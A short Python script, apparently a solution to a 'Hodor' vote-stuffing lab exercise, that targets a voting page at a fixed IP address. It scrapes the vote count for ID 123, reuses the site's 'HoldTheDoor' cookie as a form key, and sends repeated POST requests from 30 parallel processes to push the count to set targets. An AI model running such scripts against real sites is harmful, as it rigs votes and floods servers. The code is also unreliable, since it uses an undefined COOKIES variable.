#!/usr/bin/python3
"""
testing app for hodor apps uses requests library
"""
import requests
import multiprocessing

URL = 'http://54.221.6.249/level0.php'
HEADERS = {'Content-Type': 'application/x-www-form-urlencoded'}
DATA = {
    'id': '123',
    'holdthedoor': 'submit',
    }
ID = '<td>\n123    </td>'
VOTES = 0


def count_votes(htmlstring):
    global VOTES
    for i in range(len(htmlstring)):
        if htmlstring[i:(i + len(ID))] == ID:
            VOTES = int(htmlstring[(i + 27):(i + 32)])
            break


def vote(end):
    global VOTES
    global DATA
    global COOKIES
    r = requests.get(URL)
    count_votes(r.text)
    while VOTES < end:
        DATA['key'] = r.cookies['HoldTheDoor']
        r = requests.post(URL, data=DATA, headers=HEADERS, cookies=COOKIES)
        count_votes(r.text)


def start_process():
    end = 950
    p = multiprocessing.Process(target=vote, args=(end,))
    return p


def app():
    running = []
    for i in range(30):
        running.append(start_process())
        running[i].start()
    for i in running:
        i.join()
    vote(1024)


def test():
    r = requests.get(URL)
    count_votes(r.text)
    print('Votes = {:d} for ID: {:}'.format(VOTES, ID[5:8]))
    print('status code:\n', r.status_code)
    print('headers:\n', r.headers)
#    print('text:\n', r.text)


if __name__ == '__main__':
    test()
